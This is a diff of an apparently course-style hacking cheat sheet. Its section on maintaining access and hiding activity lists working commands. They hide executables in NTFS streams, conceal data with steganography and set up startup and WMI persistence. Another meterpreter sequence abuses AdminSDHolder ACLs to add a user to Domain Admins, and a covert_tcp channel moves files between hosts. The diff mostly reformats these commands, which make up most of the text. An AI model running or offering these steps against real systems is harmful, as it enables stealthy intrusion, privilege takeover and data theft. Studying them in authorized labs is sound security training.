@@ -153,51 +153,51 @@ use post/windows/manage/sticky_keys
 
 ## Maintain remote access and hide malicious activities
 
-- User system monitoring and surveillance using Power Spy
+- User system monitoring and surveillance using Power Spy  
 windows software
 
-- User system monitoring and surveillance using Spytech SpyAgent
+- User system monitoring and surveillance using Spytech SpyAgent  
 windows software
 
-- Hide files using NTFS streams
-type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+- Hide files using NTFS streams  
+type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe  
 mklink backdoor.exe readme.txt:calc.exe
 
-- Hide data using white space steganography
-snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
+- Hide data using white space steganography  
+snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt  
 snow -C -p "magic" readme2.txt
 
-- Image steganography using OpenStego and StegOnline
-openstego windows software
+- Image steganography using OpenStego and StegOnline  
+openstego windows software  
 <https://stegonline.georgeom.net/upload>
 
-- Maintain persistence by abusing boot or logon autostart execution
+- Maintain persistence by abusing boot or logon autostart execution  
 `cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”`
 
-- Maintain domain persistence by exploiting Active Directory Objects
-When an Active Directory group is marked a protected group; Active Directory will ensure that the owner, the ACLs and the inheritance applied on this group are the same as the ones applied on AdminSDHolder container
+- Maintain domain persistence by exploiting Active Directory Objects  
+When an Active Directory group is marked a protected group; Active Directory will ensure that the owner, the ACLs and the inheritance applied on this group are the same as the ones applied on AdminSDHolder container  
 
-after getting a meterpreter shell
-    upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads
-    powershell
-        Import-Module ./powerview.psm1
-        Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
-        Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs
-        REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /TREG_DWORD /F /D 300
-        net group “Domain Admins” Martin /add /domain
+after getting a meterpreter shell  
+    `upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads`  
+    `powershell`  
+        `Import-Module ./powerview.psm1`  
+        `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All`  
+        `Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs`  
+        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /TREG_DWORD /F /D 300`  
+        `net group “Domain Admins” Martin /add /domain`
 
-- Privilege escalation and maintain persistence using WMI
-upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads
-load powershell
-powershell_shell
-Import-Module ./WMI-Persistence.ps1
-Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe”
+- Privilege escalation and maintain persistence using WMI  
+`upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads`  
+`load powershell`  
+`powershell_shell`  
+`Import-Module ./WMI-Persistence.ps1`  
+`Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe”`
 
-- Covert channels using Covert_TCP
-cc -o covert_tcp covert_tcp.c
-tcpdump -nvvx port 8888 -i lo
-./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file/home/ubuntu/Desktop/Receive/receive.txt
-./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file/home/attacker/Desktop/Send/message.txt
+- Covert channels using Covert_TCP  
+`cc -o covert_tcp covert_tcp.c`  
+`tcpdump -nvvx port 8888 -i lo`  
+`./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file/home/ubuntu/Desktop/Receive/receive.txt`  
+`./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file/home/attacker/Desktop/Send/message.txt`
 
 ## Clear logs to hide the evidence of compromise
 
